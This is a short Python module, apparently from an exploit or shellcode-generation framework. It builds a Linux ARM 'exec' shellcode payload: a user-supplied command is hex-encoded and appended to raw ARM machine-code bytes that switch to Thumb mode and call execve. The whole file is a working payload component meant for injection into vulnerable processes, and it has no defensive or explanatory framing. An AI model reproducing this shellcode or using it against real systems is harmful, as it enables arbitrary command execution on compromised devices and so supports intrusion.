from lib.payloads.shellcode import Shellcode 


class Payload(Shellcode):
	Shellcode.info["author"] = "Unkown"
	Shellcode.info["name"] = "LinuxARM - exec shellcode"
	
	def __init__(self, **kwargs):
		db = [] 
		for x in kwargs["execommand"]:
			db.append("\\x" + x.encode("hex"))
		kwargs["execommand"] = "".join(db)

		Shellcode.info["size"] = 36 + Shellcode().getsize(kwargs["execommand"])
		Shellcode.info["payload"] = [
			r"\x01\x30\x8f\xe2\x13\xff\x2f\xe1"
			r"\x78\x46\x0a\x30\x01\x90" 
			r"\x01\xa9\x92\x1a\x0b\x27\x01\xdf"
			+ kwargs["execommand"] 
		]
